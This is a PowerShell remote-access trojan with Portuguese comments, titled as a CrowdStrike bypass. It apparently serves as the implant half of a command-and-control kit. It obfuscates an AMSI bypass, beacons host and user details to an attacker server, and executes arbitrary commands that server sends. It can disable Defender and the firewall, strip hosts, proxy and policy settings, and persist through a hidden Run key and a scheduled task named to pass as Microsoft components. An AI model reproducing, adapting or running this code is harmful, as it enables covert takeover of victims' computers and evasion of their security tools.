# Stealth Agent - CrowdStrike Bypass
# AMSI Bypass
try {
    $a1=[Ref].Assembly.GetType('Sys'+'tem.Man'+'agement.Aut'+'omation.A'+'msiUt'+'ils')
    $a2=$a1.GetField('am'+'siInit'+'Failed','NonPublic,Static')
    $a2.SetValue($null,$true)
} catch {}

# Variáveis serão injetadas pelo servidor ($s1, $s2, $s3)

# Função HTTP
function Invoke-Req {
    param($u,$m='GET',$b=$null)
    try {
        $w=[Net.WebRequest]::Create($u)
        $w.Method=$m
        $w.Headers.Add('Authorization',"Bearer $s2")
        $w.ContentType='application/json'
        if($b){
            $d=[Text.Encoding]::UTF8.GetBytes($b)
            $w.ContentLength=$d.Length
            $st=$w.GetRequestStream()
            $st.Write($d,0,$d.Length)
            $st.Close()
        }
        $r=$w.GetResponse()
        $sr=New-Object IO.StreamReader($r.GetResponseStream())
        $c=$sr.ReadToEnd()
        $sr.Close()
        $r.Close()
        return $c
    }catch{
        return $null
    }
}

# Checkin
function Do-Checkin {
    $d=@{
        token=$s2
        client_id=$s3
        hostname=$env:COMPUTERNAME
        username=$env:USERNAME
        os_version=[Environment]::OSVersion.VersionString
    }|ConvertTo-Json
    $r=Invoke-Req "$s1/api/checkin" 'POST' $d
    if($r){
        $o=$r|ConvertFrom-Json
        if($o.command){
            return @{id=$o.command_id;type=$o.command.type;params=$o.command.params}
        }
    }
    return $null
}

# Executar Shell
function Run-Cmd {
    param($c)
    try {
        # Usar Job com timeout para evitar travamento
        $job = Start-Job -ScriptBlock {
            param($cmd)
            try {
                # Executar diretamente no PowerShell (suporta ls, cd, Get-ChildItem, etc)
                $output = Invoke-Expression $cmd 2>&1 | Out-String -Width 4096
                return $output
            } catch {
                # Se falhar no PowerShell, tentar no CMD
                try {
                    $output = & cmd.exe /c $cmd 2>&1 | Out-String -Width 4096
                    return $output
                } catch {
                    return "ERRO: $_"
                }
            }
        } -ArgumentList $c

        # Aguardar até 15 segundos
        $completed = Wait-Job -Job $job -Timeout 15

        if($completed){
            $result = Receive-Job -Job $job
            Remove-Job -Job $job -Force
            if([string]::IsNullOrWhiteSpace($result)){
                return "[OK] Comando executado sem saída"
            }
            return $result.Trim()
        }else{
            # Timeout - matar o job
            Stop-Job -Job $job
            Remove-Job -Job $job -Force
            return "[TIMEOUT] Comando demorou mais de 15 segundos"
        }
    }catch{
        return "Erro: $_"
    }
}

# Enviar resultado
function Send-Result {
    param($i,$t,$r)
    $d=@{
        token=$s2
        client_id=$s3
        command_id=$i
        command=$t
        result=$r
    }|ConvertTo-Json
    Invoke-Req "$s1/api/result" 'POST' $d | Out-Null
}

# Get Info
function Get-Info {
    $o=@()
    $o+="╔═══════════════════════════════════════════════════════════════╗"
    $o+="║              INFORMAÇÕES COMPLETAS DO SISTEMA                 ║"
    $o+="╚═══════════════════════════════════════════════════════════════╝"
    $o+=""

    # SISTEMA OPERACIONAL
    $o+="┌─ SISTEMA OPERACIONAL ─────────────────────────────────────────┐"
    try{
        $os=Get-WmiObject Win32_OperatingSystem
        $o+="│ OS: $($os.Caption)"
        $o+="│ Versão: $($os.Version)"
        $o+="│ Build: $($os.BuildNumber)"
        $o+="│ Arquitetura: $($os.OSArchitecture)"
        $o+="│ Instalado em: $($os.InstallDate)"
        $uptime=[Math]::Round((New-TimeSpan -Start $os.LastBootUpTime -End (Get-Date)).TotalHours,2)
        $o+="│ Uptime: $uptime horas"
    }catch{$o+="│ [ERRO] Não foi possível obter info do SO"}
    $o+="└───────────────────────────────────────────────────────────────┘"
    $o+=""

    # USUÁRIO E HOSTNAME
    $o+="┌─ USUÁRIO E REDE ──────────────────────────────────────────────┐"
    $o+="│ Hostname: $env:COMPUTERNAME"
    $o+="│ Usuário Atual: $env:USERNAME"
    $o+="│ Domínio: $env:USERDOMAIN"
    try{
        $user=whoami
        $o+="│ Usuário Completo: $user"
    }catch{}
    try{
        $isAdmin=([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
        if($isAdmin){$o+="│ Privilégios: ADMINISTRADOR ✓"}else{$o+="│ Privilégios: Usuário comum"}
    }catch{}
    $o+="└───────────────────────────────────────────────────────────────┘"
    $o+=""

    # HARDWARE
    $o+="┌─ HARDWARE ────────────────────────────────────────────────────┐"
    try{
        $cpu=Get-WmiObject Win32_Processor|Select-Object -First 1
        $o+="│ CPU: $($cpu.Name)"
        $o+="│ Cores: $($cpu.NumberOfCores) | Threads: $($cpu.NumberOfLogicalProcessors)"
        $o+="│ Clock: $($cpu.MaxClockSpeed) MHz"
    }catch{$o+="│ [ERRO] CPU info"}

    try{
        $cs=Get-WmiObject Win32_ComputerSystem
        $ramTotal=[Math]::Round($cs.TotalPhysicalMemory/1GB,2)
        $ramFree=[Math]::Round((Get-WmiObject Win32_OperatingSystem).FreePhysicalMemory/1MB,2)
        $ramUsed=[Math]::Round($ramTotal-$ramFree,2)
        $o+="│ RAM Total: ${ramTotal}GB | Usado: ${ramUsed}GB | Livre: ${ramFree}GB"
        $o+="│ Fabricante: $($cs.Manufacturer) $($cs.Model)"
    }catch{$o+="│ [ERRO] RAM info"}

    try{
        $mb=Get-WmiObject Win32_BaseBoard
        $o+="│ Placa-Mãe: $($mb.Manufacturer) $($mb.Product)"
    }catch{}

    try{
        $gpu=Get-WmiObject Win32_VideoController|Select-Object -First 1
        $o+="│ GPU: $($gpu.Name)"
        $vram=[Math]::Round($gpu.AdapterRAM/1GB,2)
        if($vram -gt 0){$o+="│ VRAM: ${vram}GB"}
    }catch{$o+="│ [ERRO] GPU info"}
    $o+="└───────────────────────────────────────────────────────────────┘"
    $o+=""

    # DISCOS
    $o+="┌─ DISCOS ──────────────────────────────────────────────────────┐"
    try{
        $disks=Get-WmiObject Win32_LogicalDisk -Filter "DriveType=3"
        foreach($d in $disks){
            $total=[Math]::Round($d.Size/1GB,2)
            $free=[Math]::Round($d.FreeSpace/1GB,2)
            $used=[Math]::Round($total-$free,2)
            $pct=[Math]::Round(($used/$total)*100,1)
            $o+="│ $($d.DeviceID) - Total: ${total}GB | Usado: ${used}GB (${pct}%) | Livre: ${free}GB"
        }
    }catch{$o+="│ [ERRO] Disk info"}
    $o+="└───────────────────────────────────────────────────────────────┘"
    $o+=""

    # REDE
    $o+="┌─ CONFIGURAÇÃO DE REDE ────────────────────────────────────────┐"
    try{
        $adapters=Get-WmiObject Win32_NetworkAdapterConfiguration|Where-Object{$_.IPEnabled -eq $true}
        foreach($a in $adapters){
            $o+="│ Interface: $($a.Description)"
            if($a.IPAddress){$o+="│   IP: $($a.IPAddress -join ', ')"}
            if($a.IPSubnet){$o+="│   Máscara: $($a.IPSubnet[0])"}
            if($a.DefaultIPGateway){$o+="│   Gateway: $($a.DefaultIPGateway -join ', ')"}
            if($a.DNSServerSearchOrder){$o+="│   DNS: $($a.DNSServerSearchOrder -join ', ')"}
            if($a.MACAddress){$o+="│   MAC: $($a.MACAddress)"}
            $o+="│"
        }
    }catch{$o+="│ [ERRO] Network info"}
    $o+="└───────────────────────────────────────────────────────────────┘"
    $o+=""

    # ANTIVÍRUS E FIREWALL
    $o+="┌─ SEGURANÇA ───────────────────────────────────────────────────┐"
    try{
        $defender=Get-MpComputerStatus -ErrorAction SilentlyContinue
        if($defender){
            $rtm=if($defender.RealTimeProtectionEnabled){"✓ ATIVO"}else{"✗ DESATIVADO"}
            $o+="│ Windows Defender: $rtm"
            $o+="│ Última Verificação: $($defender.QuickScanEndTime)"
        }else{
            $o+="│ Windows Defender: Não disponível"
        }
    }catch{$o+="│ Windows Defender: [ERRO ao verificar]"}

    try{
        $fw=netsh advfirewall show allprofiles state|Select-String "State"
        $o+="│ Firewall: $($fw -join ' | ')"
    }catch{$o+="│ Firewall: [ERRO ao verificar]"}
    $o+="└───────────────────────────────────────────────────────────────┘"
    $o+=""

    # PROCESSOS E SERVIÇOS
    $o+="┌─ PROCESSOS ATIVOS (Top 5 CPU) ────────────────────────────────┐"
    try{
        $procs=Get-Process|Sort-Object CPU -Descending|Select-Object -First 5
        foreach($p in $procs){
            $cpu=[Math]::Round($p.CPU,2)
            $mem=[Math]::Round($p.WorkingSet/1MB,2)
            $o+="│ $($p.Name) - CPU: ${cpu}s | RAM: ${mem}MB | PID: $($p.Id)"
        }
    }catch{$o+="│ [ERRO] Process info"}
    $o+="└───────────────────────────────────────────────────────────────┘"

    return $o -join "`n"
}

# Disable Defender
function Dis-Def {
    $r=@()
    try{Set-MpPreference -DisableRealtimeMonitoring $true;$r+="[OK] Real-time off"}catch{$r+="[FAIL] Real-time"}
    try{Set-MpPreference -DisableIOAVProtection $true;$r+="[OK] IOAV off"}catch{$r+="[FAIL] IOAV"}
    try{Set-MpPreference -DisableBehaviorMonitoring $true;$r+="[OK] Behavior off"}catch{$r+="[FAIL] Behavior"}
    try{Add-MpPreference -ExclusionPath "C:\";$r+="[OK] Exclusion C:\"}catch{$r+="[FAIL] Exclusion"}
    return $r -join "`n"
}

# Disable Firewall
function Dis-FW {
    $r=@()
    try{netsh advfirewall set allprofiles state off|Out-Null;$r+="[OK] Firewall off"}catch{$r+="[FAIL] Firewall"}
    return $r -join "`n"
}

# Liberar Navegação - Remove restrições de proxy, hosts, firewall
function Free-Web {
    $r=@()

    # 1. Remover configurações de Proxy
    try{
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name ProxyEnable -Value 0 -ErrorAction Stop
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name ProxyServer -Value "" -ErrorAction Stop
        $r+="[OK] Proxy removido"
    }catch{$r+="[FAIL] Proxy"}

    # 2. Limpar arquivo HOSTS (remove bloqueios de sites)
    try{
        $hostsPath="$env:SystemRoot\System32\drivers\etc\hosts"
        $defaultHosts=@"
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
127.0.0.1       localhost
::1             localhost
"@
        Set-Content -Path $hostsPath -Value $defaultHosts -Force -ErrorAction Stop
        $r+="[OK] Hosts limpo"
    }catch{$r+="[FAIL] Hosts"}

    # 3. Remover restrições do Internet Explorer/Edge
    try{
        Remove-ItemProperty -Path "HKCU:\Software\Policies\Microsoft\Internet Explorer\Control Panel" -Name "HomePage" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path "HKCU:\Software\Policies\Microsoft\Internet Explorer\Main" -Name "Start Page" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Internet Explorer\Main" -Name "Start Page" -ErrorAction SilentlyContinue
        $r+="[OK] Restrições IE/Edge removidas"
    }catch{$r+="[FAIL] IE/Edge"}

    # 4. Liberar regras de Firewall para navegação (portas 80, 443)
    try{
        netsh advfirewall firewall add rule name="Allow HTTP" dir=out action=allow protocol=TCP localport=80 | Out-Null
        netsh advfirewall firewall add rule name="Allow HTTPS" dir=out action=allow protocol=TCP localport=443 | Out-Null
        netsh advfirewall firewall add rule name="Allow DNS" dir=out action=allow protocol=UDP localport=53 | Out-Null
        $r+="[OK] Firewall liberado (HTTP/HTTPS/DNS)"
    }catch{$r+="[FAIL] Firewall"}

    # 5. Remover políticas de grupo que bloqueiam sites
    try{
        Remove-Item -Path "HKCU:\Software\Policies\Microsoft\Internet Explorer\Control Panel" -Recurse -Force -ErrorAction SilentlyContinue
        Remove-Item -Path "HKLM:\Software\Policies\Microsoft\Internet Explorer\Control Panel" -Recurse -Force -ErrorAction SilentlyContinue
        $r+="[OK] Políticas de grupo removidas"
    }catch{$r+="[FAIL] Políticas"}

    # 6. Resetar configurações de DNS (usar Google DNS)
    try{
        $adapters = Get-NetAdapter | Where-Object {$_.Status -eq "Up"}
        foreach($adapter in $adapters){
            Set-DnsClientServerAddress -InterfaceIndex $adapter.ifIndex -ServerAddresses ("8.8.8.8","8.8.4.4") -ErrorAction SilentlyContinue
        }
        $r+="[OK] DNS configurado (Google DNS)"
    }catch{$r+="[FAIL] DNS"}

    # 7. Limpar cache DNS
    try{
        ipconfig /flushdns | Out-Null
        $r+="[OK] Cache DNS limpo"
    }catch{$r+="[FAIL] Cache DNS"}

    return $r -join "`n"
}

# Função de instalação persistente (SEM precisar de admin)
function Install-Persistence {
    try{
        # Usar TEMP (sempre tem permissão)
        $installPath="$env:TEMP\Microsoft\Windows"
        if(!(Test-Path $installPath)){
            New-Item -ItemType Directory -Path $installPath -Force | Out-Null
        }

        # Copiar script para local permanente
        $scriptPath="$installPath\UpdateCheck.ps1"
        $scriptContent=@"
`$s1='$s1'
`$s2='$s2'
`$s3='$s3'
"@ + (Get-Content $PSCommandPath -Raw -ErrorAction SilentlyContinue)

        if(!$scriptContent){
            $scriptContent=@"
`$s1='$s1'
`$s2='$s2'
`$s3='$s3'
"@ + $MyInvocation.MyCommand.ScriptBlock
        }

        Set-Content -Path $scriptPath -Value $scriptContent -Force

        # Tentar ocultar (se falhar, não problema)
        try{(Get-Item $installPath -Force).Attributes='Hidden'}catch{}
        try{(Get-Item $scriptPath -Force).Attributes='Hidden'}catch{}

        # Registro (SEMPRE funciona sem admin)
        $regPath="HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        Set-ItemProperty -Path $regPath -Name "WindowsSecurityHealth" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File `"$scriptPath`"" -Force -ErrorAction SilentlyContinue

        # Tentar criar tarefa agendada (se tiver permissão)
        try{
            $action=New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File `"$scriptPath`""
            $trigger=New-ScheduledTaskTrigger -AtLogOn
            $settings=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
            Register-ScheduledTask -TaskName "MicrosoftEdgeUpdateCore" -Action $action -Trigger $trigger -Settings $settings -Force -ErrorAction SilentlyContinue | Out-Null
        }catch{}

        # Iniciar imediatamente em background
        Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File `"$scriptPath`"" -WindowStyle Hidden -ErrorAction SilentlyContinue

        return "[OK] Persistência instalada!"
    }catch{
        return "[ERRO] Falha: $_"
    }
}

# Se chamado com -Install, apenas instalar e sair
if($Install){
    $result=Install-Persistence
    Write-Host $result
    exit
}

# Loop principal silencioso
while($true){
    try{
        $cmd=Do-Checkin
        if($cmd){
            $res=""
            switch($cmd.type){
                'shell'{
                    if($cmd.params.cmd){
                        $res=Run-Cmd $cmd.params.cmd
                    }else{
                        $res="[ERRO] Nenhum comando fornecido"
                    }
                }
                'get_info'{
                    $res=Get-Info
                }
                'disable_defender'{
                    $res=Dis-Def
                }
                'disable_firewall'{
                    $res=Dis-FW
                }
                'free_web'{
                    $res=Free-Web
                }
                'disable_all'{
                    $res=(Dis-Def)+"`n"+(Dis-FW)+"`n"+(Free-Web)
                }
                default{
                    $res="[ERRO] Comando desconhecido: $($cmd.type)"
                }
            }
            Send-Result $cmd.id $cmd.type $res
        }
        Start-Sleep -Seconds 1
    }catch{
        Start-Sleep -Seconds 1
    }
}

